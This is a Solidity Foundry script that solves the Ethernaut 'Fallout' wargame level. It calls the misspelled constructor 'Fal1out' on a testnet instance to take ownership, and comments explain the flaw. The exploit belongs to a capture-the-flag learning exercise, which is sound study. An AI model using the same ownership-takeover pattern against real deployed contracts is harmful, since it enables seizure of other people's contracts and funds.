// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallout} from "../src/Fallout.sol";

contract Exp is Script {
    // $ forge script script/Fallout.s.sol
    // $ forge script script/Fallout.s.sol:Exp --rpc-url $SEPOLIA_RPC_URL --account updraft --broadcast -vvvvv
    // $ make falloutExp ARGS='--network sepolia'
    Fallout public falloutInstance = Fallout(payable(0xfbA7DB77e7F0c4C3Ac597DB5269dEEE17eC0A3d9)); // https://ethernaut.openzeppelin.com/ Get new instance address from Ethernaut

    function run() external {
        // Fallout falloutInstance = new Fallout();

        // - The constuctor in solidity v6 should has the name of teh contract like java
        // - The issue here is that the contract name is `Fallout` and the constructor wrongly wrote as `Fal1out`
        // - since `Fal1out` is a normal function, anyone can be the owner of the contract by firing the function
        console.log("Owner:", falloutInstance.owner());
        vm.startBroadcast();
        falloutInstance.Fal1out();
        vm.stopBroadcast();
        console.log("New Owner:", falloutInstance.owner());
    }
}
